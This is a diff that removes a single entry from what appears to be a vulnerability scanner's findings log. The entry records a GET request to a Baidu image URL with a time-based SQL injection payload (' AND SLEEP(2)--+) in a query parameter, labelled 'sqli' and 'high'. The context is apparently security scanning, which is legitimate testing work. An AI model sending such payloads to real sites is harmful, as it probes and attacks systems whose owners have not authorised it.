@@ -1,7 +1,0 @@
-
-[vuln]
-Method:GET
-Url:https://gimg3.baidu.com/rel/src=https%3A%2F%2Fgips3.baidu.com%2Fit%2Fu%3D2050751846%2C969664059%26fm%3D3028%26app%3D3028%26f%3DJPEG%26fmt%3Dauto%26q%3D100%26size%3Df1138_640&refer=http%3A%2F%2Fwww.baidu.com&app=2010&size=w560&n=0&g=0n&q=100&fmt=auto?sec=1667926800' AND SLEEP(2)--+&t=36e5428ef115ec8c56ab5b519aa0b9aa
-Vuln_type:sqli
-Level:high
-
